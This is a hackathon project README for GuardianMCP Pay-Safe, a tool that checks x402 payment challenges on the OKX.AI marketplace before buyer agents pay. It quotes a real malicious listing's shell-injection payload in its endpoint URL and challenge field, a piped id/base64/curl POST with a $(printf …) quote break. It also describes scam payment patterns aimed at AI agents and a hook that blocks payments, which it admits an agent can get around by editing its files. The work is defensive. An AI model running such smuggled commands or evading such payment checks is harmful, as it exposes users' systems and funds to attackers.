# GuardianMCP Pay-Safe — OKX Dev Day 2026

**Team:** LNO Alpha (remote) · **Track:** Build a Company / Best Remote Demo

**Judges start here:**
[**/agent-runs**](https://guardian-mcp-rho.vercel.app/agent-runs) (watch a real agent's scam payment get blocked) ·
[**/trust**](https://guardian-mcp-rho.vercel.app/trust) (live OKX.AI marketplace scan) ·
[**/company**](https://guardian-mcp-rho.vercel.app/company) (the business) ·
[**/pay-safe**](https://guardian-mcp-rho.vercel.app/pay-safe) (try it) ·
[**/mcp**](https://guardian-mcp-rho.vercel.app/mcp) (MCP server)

**Repository:** https://github.com/InkoStrategy/guardian-mcp · **OKX.AI agent:** GuardianMCP #13730
**Demo video (v6.1, 3:56):** https://youtu.be/s8KSV2YMlyE _(uploading the v6 cut with the live-agent scene; the rendered file ships in the repo)_

> Pay-Safe checks an x402 payment **before** an agent pays it. It compares the seller's 402 challenge with
> what the OKX.AI listing promised (price, token, endpoint), with the payee the buyer expects, and with the
> token contract itself (EIP-712 domain), and returns ALLOW / WARN / DENY with evidence. Nothing is signed or paid.

## The problem

On OKX.AI, buyer agents discover a service, call its endpoint, receive `402 Payment Required` and pay
the challenge through Onchain OS. The challenge is written by the seller. Nothing between "402 received"
and "authorization signed" checks that the challenge matches the listing the agent chose.

We scanned the live marketplace to see what that gap looks like in practice
([docs/trust-scan.md](docs/trust-scan.md)): every paid A2MCP service we could find was requested once
without paying, and its challenge was checked against its own listing. The scan is dated and public — see
the live dashboard at **[/trust](https://guardian-mcp-rho.vercel.app/trust)** and the history at `GET /trust-scans`.

| Result | 16 Sep 2026 | 17 Sep 2026 |
|---|---|---|
| Paid A2MCP services found | 62 | 67 |
| Returned an x402 challenge (HTTP, POST or MCP `tools/call`) | 25 | 29 |
| ALLOW | 13 | 16 |
| WARN | 11 | 13 |
| DENY | 1 | 0 |

(Live figures: `GET /trust-scans`.) The 16 Sep DENY was the malicious "Market Signal API" (sid 39876) below.
By the 17 Sep re-scan it had dropped out of marketplace **discovery** (`agent service-match`); the listing
record still resolves by explicit sid via `agent service-detail`, and Guardian still returns its verdict
(`check_listing` falls back to the dated snapshot that last saw it), so the finding stays reproducible.

What the scan found:

- **A listing that attacks buyer agents.** The endpoint URL of "Market Signal API" (sid 39876) is
  `…/market-insight;id|{base64,-w0}|{curl,-fsS,-m,8,-X,POST,…}`, and its challenge hides a quote break
  plus `$(printf …)` and `curl` in `extra.name`. Any agent that passes the URL or the challenge to a
  shell runs the attacker's commands. OKX's own A2MCP skill warns that service metadata "may contain
  shell metacharacters"; Pay-Safe turns that warning into a DENY.
- **Five challenges with an EIP-712 domain the token does not use.** They declare `USDT` v1,
  `USDT₀` v1 or `USD₮0` v2. The USD₮0 contract on X Layer (`0x779d…3736`) returns
  `DOMAIN_SEPARATOR 0xd591d9ba…`, which matches only name `USD₮0` version `1`. `onchainos payment
  pay-local` builds the domain from `extra.name` / `extra.version`, so signatures built from those challenges
  fail on-chain. One of the five is the attack listing above; the other four are regular sellers. This is an
  on-chain fact, not a table lookup: `node scripts/verify-eip712-domain.js` reads `DOMAIN_SEPARATOR()`
  (selector `0x3644e515`) live from the token and shows every declared pair but the canonical one is rejected.
- **Heuristics tuned on real data.** The first pass produced 3 false DENYs on honest sellers whose
  hosts contain "okx" or use cheap TLDs. Host patterns are now split by strength and weighed against
  the listing, and the rerun has one DENY: the real attack.

## Built in the online build window (17–25 Sep 2026)

| Commit (UTC date) | Feature |
|---|---|
| `0a622e9` 17 Sep | Real MCP server at `POST /mcp` (Streamable HTTP): free tools `check_payment`, `probe_payment`, `verify_settlement`, `check_listing`, `check_address`, `check_domain`, `analyze_transaction`, `analyze_signature`, plus the x402-paid `guard` tool (0.099 USD₮0 on X Layer, 402 at `tools/call`). Verified with OKX's own CLI: `onchainos payment quote` discovers every tool, gets DENY results from the free tools and a payment quote for `guard` ([captures](demo-video/captures)). Public `POST /verify-settlement`. (`check_quote` was added the same window at `601941b`, for **10 tools** total — what the live `tools/list` returns today.) |
| `601941b`, `4b63a9f` · 17 Sep | **Onchain OS payment gate.** `onchainos payment quote` saves each quote to `~/.onchainos/payments/<paymentId>.json`, and `payment pay --payment-id` signs from that file without fetching the 402 again. `POST /check-quote` and the MCP tool `check_quote` check that file and bind the verdict to the paymentId with a SHA-256 fingerprint of the signed entry. New rules: `challenge_header_body_mismatch`, `quote_inconsistent`, `quote_expired`, `quote_partial`. A Claude Code `PreToolUse` hook ([hooks/](hooks/README.md)) blocks `onchainos payment pay` when no verdict is bound, the entry or index changed, the verdict is DENY, or the verdict came from a Guardian the owner does not trust. It asks on WARN, on `--yes`, and when the quote passed with no marketplace listing to compare; and it blocks shell URLs (including quote-break payloads), sign-only and raw-key payments. `safe-pay --quote-first` prints every CLI argv. |
| `601941b`, `eaacaa8` · 17 Sep | **Found with the real CLI:** new demo seller `header-body-split`. Its 402 JSON body shows the listed wallet, but its `PAYMENT-REQUIRED` header pays another address. `onchainos payment quote` saved the header payee as the entry to sign, and its summary (`Will pay 0.001 USDT (exact, X Layer)`) does not name the payee. So an agent that reads the body is shown one payment while the wallet signs another. `/check-quote` returns DENY `challenge_header_body_mismatch` without knowing the payee, and the hook blocks the pay ([capture](demo-video/captures/check-quote-header-body-split.txt)). Re-probing 24 live marketplace challenges found 8 that send both copies and none that differ, so the rule adds no false DENYs there. |

## Built on 16 Sep 2026

The team was selected for the build round on 16 Sep and started the same day, one day before the 17–25 Sep
window shown in the builder briefing, so this work is listed separately. Earlier GuardianMCP work (13–14 Sep:
transaction and signature firewall, shared threat registry, benchmark) is pre-existing and not part of this submission.

| Commit | Feature |
|---|---|
| `1151209` | `POST /check-payment`: x402 v1/v2 challenge parsing, 32 payment rules, listing comparison (price, token, payee, endpoint domain), canonical settlement assets, EIP-3009 signature recovery, Permit2 spender / token / amount / witness checks, recommended entry among `accepts[]` |
| `fefe1d2` | `endpoint_url_injection`, listing-aware host checks, EIP-712 domain evidence from the verified on-chain `DOMAIN_SEPARATOR` |
| `9a7be92` | `challenge_field_injection`, host pattern strength, MCP resource ids; API docs and agent skill updated |
| `05b1fa1` | OKX.AI marketplace trust scan (`scripts/okxai-trust-scan.js`) with MCP probing; published report |
| `47bc206` | `scripts/safe-pay.js`: end-to-end Onchain OS buyer flow with a quote time-of-check/time-of-use guard |
| `7c13562` | `POST /probe-payment` (URL in, verdict out, SSRF-guarded), demo x402 sellers, the `/pay-safe` page |
| `2a1a94a` | Quote guard reads the payee from `decodedChallenge.recipient` (found on a third-party listing), quote over the capture transport, no `--yes` in printed commands |
| `5fa5523` | On-chain settlement check (`src/settlement.js`, `scripts/verify-settlement.js`, step 6 of safe-pay); first real guarded payment settled as checked |

Pay-Safe now has 41 payment rules; the full suite has 172 passing tests (`npm test`), including local HTTP and MCP servers, signed EIP-3009 payloads,
Permit2 payloads, SSRF targets, every demo scenario, Onchain OS quotes recorded from the real CLI, and the payment-gate hook's bypass and binding cases.

## A real payment through the guarded flow

On 16 Sep 2026 the team's Onchain OS wallet paid **0.005 USD₮0** for "URL Change Check API" (OKX.AI sid 39856)
through `scripts/safe-pay.js`: listing → unpaid challenge → Pay-Safe ALLOW → quote guard → owner-approved
`onchainos payment pay` → seller result → on-chain settlement check.

- Transaction: [0xd0dab0bb9ae26fd68b4772d2a7f197314ec296a606530077a233c3769cf3070d](https://www.oklink.com/x-layer/tx/0xd0dab0bb9ae26fd68b4772d2a7f197314ec296a606530077a233c3769cf3070d) (X Layer, block 70825096, gas paid by the facilitator)
- Transfer: 5000 atomic USD₮0 from `0xe1c6…f67b` to `0xc462…9d60`, the payee Pay-Safe checked
- Reproduce the check: `node scripts/verify-settlement.js --tx 0xd0dab0bb9ae26fd68b4772d2a7f197314ec296a606530077a233c3769cf3070d --pay-to 0xc4622689eb6c38c929fe254777b449a5dedf9d60 --amount 5000`

## Unedited agent runs (the hook, live)

We pointed a headless Claude Code agent at the real Onchain OS CLI and recorded every step
(live at **[/agent-runs](https://guardian-mcp-rho.vercel.app/agent-runs)**; raw transcripts in [demo-video/captures/agent-runs/](demo-video/captures/agent-runs)). The runs use a clean copy of the repo
with no secrets, a tight per-scenario allow list, and the Guardian hook; `payment pay` is also a deny-rule
backstop, and the demo sellers have no facilitator, so no funds can move. Nothing is edited.

- **Header/body split** ([transcript](demo-video/captures/agent-runs/guardian-header-body-split.md)): the
  agent quotes the seller, `check-quote` returns **DENY `challenge_header_body_mismatch`**, and when the agent
  runs `onchainos payment pay … --yes` the **Guardian hook blocks it** — "GuardianMCP: DENY
  challenge_header_body_mismatch". The agent then reports the payment was blocked, correctly.
- **Honest seller** ([transcript](demo-video/captures/agent-runs/guardian-honest-seller.md)): `check-quote`
  returns **ALLOW (risk 0)** and prints the exact pay command **without `--yes`** ("the wallet only returns a
  confirmation prompt and pays nothing"). In this locked-down harness the pay itself is then refused by the
  sandbox, so no funds move — Guardian's part here is the clean ALLOW verdict, and the final `--yes` still
  belongs to the wallet owner.
- **Malicious listing sid 39876** ([transcript](demo-video/captures/agent-runs/guardian-malicious-listing-39876.md)):
  the agent reads the listing, recognises the endpoint is a `id | base64 | curl … /rce/…` shell-injection
  payload, treats the listing text as untrusted data rather than an instruction, and **refuses** — the
  attacker host is never contacted.

## How it integrates with OKX AI

```
buyer agent ──► onchainos agent service-detail --sid N        listing: endpoint, price, token, seller
            ──► endpoint (unpaid GET / POST / MCP tools/call)   402 challenge, nothing signed
            ──► Guardian POST /check-payment                   ALLOW / WARN / DENY + evidence
            ──► onchainos payment quote                        paymentId, saved to ~/.onchainos/payments
            ──► quote guard: same payee, amount, token, network as checked
            ──► Guardian POST /check-quote                     checks the saved entry pay will sign, binds the verdict
            ──► onchainos payment pay --payment-id …   hook: blocked unless a bound ALLOW; the wallet asks the owner
            ──► settlement check: the on-chain Transfer matches the checked payee, amount and token
```

- **OKX.AI marketplace:** listings come from `onchainos agent service-detail` / `service-match`.
- **Onchain OS payments:** `payment quote` and `payment pay` on X Layer (`eip155:196`) in USD₮0.
  The wrapper never adds `--yes` on its own; moving funds stays with the wallet owner, who passes it explicitly.
- **MCP server:** `https://guardian-mcp-rho.vercel.app/mcp` works with Onchain OS A2MCP clients: the paywall sits at `tools/call`, so tool discovery and free checks cost nothing and only `guard` returns an x402 challenge.
- **Inside the payment command:** the Claude Code hook reads `onchainos payment pay` before it runs and checks it against the verdict bound to the saved quote ([hooks/README.md](hooks/README.md)).
- **Agent skill:** `skills/guardian-mcp/SKILL.md` tells Onchain OS agents to call `/check-payment`
  before paying any 402 challenge.
- **Listed service:** GuardianMCP is registered on OKX.AI as agent #13730.

## Test in 60 seconds

All commands were run against production on 17 Sep 2026.

List the MCP tools:

```bash
curl -s -X POST https://guardian-mcp-rho.vercel.app/mcp -H "content-type: application/json" -d '{"jsonrpc":"2.0","id":1,"method":"tools/list"}'
```

Ask the MCP server to probe a demo seller whose payee imitates the expected wallet (expect DENY `payto_poisoning`):

```bash
curl -s -X POST https://guardian-mcp-rho.vercel.app/mcp -H "content-type: application/json" -d '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"probe_payment","arguments":{"url":"https://guardian-mcp-rho.vercel.app/demo/x402/payee-swap","expected":{"feeAmount":0.001,"feeToken":"0x779ded0c9e1022225f8e0630b35a9b54be713736","payTo":"0xe1c6f89df50fb68282d52e34d6001d65005ff67b","endpoint":"https://guardian-mcp-rho.vercel.app/demo/x402/payee-swap"}}}}'
```

Verify the real guarded payment on X Layer:

```bash
curl -s -X POST https://guardian-mcp-rho.vercel.app/verify-settlement -H "content-type: application/json" -d '{"txHash":"0xd0dab0bb9ae26fd68b4772d2a7f197314ec296a606530077a233c3769cf3070d","payTo":"0xc4622689eb6c38c929fe254777b449a5dedf9d60","amount":"5000"}'
```

With Onchain OS (read-only, nothing is signed):

```bash
onchainos payment quote https://guardian-mcp-rho.vercel.app/mcp --tool check_listing --param sid=39876
```

Check what the wallet will actually sign (needs a logged-in Onchain OS CLI and this repository; nothing is signed). Expect DENY `challenge_header_body_mismatch`:

```bash
onchainos payment quote https://guardian-mcp-rho.vercel.app/demo/x402/header-body-split
```

```bash
node scripts/check-quote.js --payment-id <paymentId from the quote> --endpoint https://guardian-mcp-rho.vercel.app/demo/x402/header-body-split --fee 0.001 --token 0x779ded0c9e1022225f8e0630b35a9b54be713736
```

Add it to any MCP client, for example Claude Code:

```bash
claude mcp add --transport http guardian https://guardian-mcp-rho.vercel.app/mcp
```

## Try it

**Browser:** https://guardian-mcp-rho.vercel.app/pay-safe. Click a demo seller (honest, price bait,
poisoned payee, fake stablecoin, wrong EIP-712 domain, shell payload) or paste any paid endpoint.

**One call, URL in:**

```bash
curl -s -X POST https://guardian-mcp-rho.vercel.app/probe-payment -H "Content-Type: application/json" \
  -d '{"url":"https://guardian-mcp-rho.vercel.app/demo/x402/price-bait","expected":{"feeAmount":0.001,"feeToken":"0x779ded0c9e1022225f8e0630b35a9b54be713736","payTo":"0xe1c6f89df50fb68282d52e34d6001d65005ff67b","endpoint":"https://guardian-mcp-rho.vercel.app/demo/x402/price-bait"}}'
```

**Challenge in (agents that already hold the PAYMENT-REQUIRED header):**

```bash
curl -s -X POST https://guardian-mcp-rho.vercel.app/check-payment -H "Content-Type: application/json" \
  -d '{"paymentRequired":"<PAYMENT-REQUIRED header>","requestUrl":"https://seller.example/paid","expected":{"feeAmount":0.002,"feeToken":"0x779ded0c9e1022225f8e0630b35a9b54be713736","endpoint":"https://seller.example/paid"}}'
```

**Onchain OS buyer flow (needs a logged-in `onchainos`):**

```bash
node scripts/safe-pay.js --sid 33342 --param scoutMode=best --max 0.5
```

Exit code 0 means the quote is ready to pay exactly what was checked, 2 means WARN and 3 means DENY or a quote mismatch.

Other endpoints: `GET /demo/x402` (scenarios and their listings), `GET /trust-scan` (scan JSON),
`GET /rules` (all rules with severities).

## The company

The full case is a page on the site: **[/company](https://guardian-mcp-rho.vercel.app/company)**. In short,
told honestly (the checks are free today; **0 paid calls so far**):

- **The gap, in dollars.** From our own scans, of the paid OKX.AI services that returned a challenge on
  16 Sep, ~48% (12 of 25) drew a WARN or DENY, including one outright attack listing and five sellers whose
  wrong EIP-712 domain makes a paid call fail at settlement. Every unguarded payment is an uncapped loss:
  a swapped payee sends funds to an attacker; a wrong domain means the buyer pays and the call still fails.
- **Customer.** Buyer agents and their operators on OKX.AI (who lose the funds), agent frameworks and wallets
  that want a drop-in safety layer, and OKX.AI itself (marketplace integrity).
- **Wedge.** The one call that has to happen before every x402 payment and currently doesn't — free,
  deterministic, one line to add as an Onchain OS skill, an MCP tool, or a Claude Code hook.
- **Model.** Free per-call checks land everywhere and feed the shared threat registry; premium `guard`
  (0.099 USD₮0/call over x402 on X Layer — live) adds session health, owner alerts and reference-template
  diffs; a hosted SLA tier for frameworks and wallets comes next.
- **Defensibility.** A shared cross-agent threat registry whose value compounds with usage (a network effect),
  deterministic auditable verdicts, a check wired into OKX's own CLI flow and the pay command itself, and the
  dated public trust scan as both distribution and a growing dataset of real attack shapes.

## Rules

DENY: `amount_above_listing`, `amount_above_user_cap`, `asset_mismatch_listing`, `asset_lookalike`,
`asset_not_contract`, `payto_mismatch_listing`, `payto_poisoning`, `payto_zero_address`, `payto_is_asset`,
`payment_domain_mismatch`, `endpoint_url_injection`, `challenge_field_injection`,
`endpoint_phishing_pattern`, `accepted_mismatch`, `signed_recipient_mismatch`, `signed_amount_mismatch`,
`signed_token_mismatch`, `signed_spender_not_x402_proxy`, `signed_network_mismatch`, `challenge_header_body_mismatch`,
`quote_inconsistent`, plus the shared
registry and ScamSniffer database hits on the payee.

WARN: `eip712_domain_mismatch`, `endpoint_domain_suspicious`, `upto_cap_above_listing`,
`recurring_payment`, `permit2_approval_required`, `unknown_settlement_asset`, `unknown_payment_scheme`,
`payment_network_unsupported`, `testnet_payment`, `multiple_payees`, `long_payment_timeout`,
`resource_host_mismatch`, `insecure_payment_endpoint`, `signed_validity_too_long`, `signed_expired`,
`signed_payer_mismatch`, `signature_does_not_recover`, `quote_expired`, `quote_partial`, `fresh_recipient`.

## Status and honest notes

- **Numbers.** "41 payment rules" is the Pay-Safe payment layer; the full `GET /rules` catalogue across all
  layers (transaction, signature, payment, registry, session) is 94. 172 tests pass (`npm test`).
- **OKX.AI listing.** Agent identity **#13730 is registered**; the marketplace *service listing* is still
  under review by OKX, so it is not "approved". The integration is live regardless — through the
  CLI-discoverable MCP server (`onchainos payment quote …/mcp`) and the guarded Onchain OS pay flow.
- **Revenue.** The `guard` premium is priced and live, but `GET /stats` shows **0 paid calls** — no revenue
  or users are claimed. The company case at [/company](https://guardian-mcp-rho.vercel.app/company) is a plan.
- **Live scan drifts.** The malicious sid 39876 has left the marketplace since 16 Sep, so `/trust` now shows
  0 DENY; `check_listing` re-derives its verdict from the dated 16 Sep snapshot, and `/trust` keeps the catch
  visible under "previously flagged".

## Limits

- Deterministic rules, not a guarantee. ALLOW means no rule fired.
- A check with no listing supplied returns WARN `listing_not_checked`, never a clean ALLOW: with nothing to
  compare against, price, token and payee were not verified.
- 37 of 62 marketplace services did not return a challenge to an unpaid request without their
  business parameters, so the scan covers the 25 that did.
- A listing does not publish the seller's payout wallet, and 11 of 25 challenges pay an address other
  than the seller's agent wallet. Payee checks therefore use `expected.payTo` when the buyer has it,
  plus poisoning, registry and on-chain checks.
- The Claude Code hook is not installed automatically and covers Claude Code only. It stops confused or prompt-injected
  agents; an agent that deliberately edits `~/.guardian` or the saved quote files can get around it.
- `/probe-payment` resolves DNS and blocks private addresses before the request. A host that changes
  its DNS answer between that check and the request is not fully covered.

## Demo video (v6.1, 3:56)

The cut, scene by scene (script in [demo-video/narration.json](demo-video/narration.json), machine-generated):

1. **Title** — one call before every x402 payment on OKX.AI; it runs inside OKX's own CLI.
2. **The gap** — an agent trusts whatever the 402 says; nothing checks it against the listing before it signs.
3. **`/pay-safe`, honest seller** — ALLOW; the comparison rows resolve green.
4–6. **The staged attacks** — price bait DENY, poisoned payee DENY, wrong EIP-712 domain WARN.
7. **The real marketplace** — the 16 Sep trust scan: 62 services, exactly one DENY.
8. **MCP server** — OKX's own CLI discovers the 10 tools; `check_listing` on sid 39876 returns DENY.
9. **The payment gate** — the header/body split; `/check-quote` DENY; the Claude Code hook blocks the pay.
10. **The live agent (S9B)** — an unedited headless agent quotes, gets DENY, tries to pay — and the hook
    blocks it: "the agent cannot pay the scam."
11. **A real settled payment** — 0.005 USD₮0 on X Layer, verified on-chain.
12. **Close** — add it in one line; 10 tools, 41 rules, 172 tests.
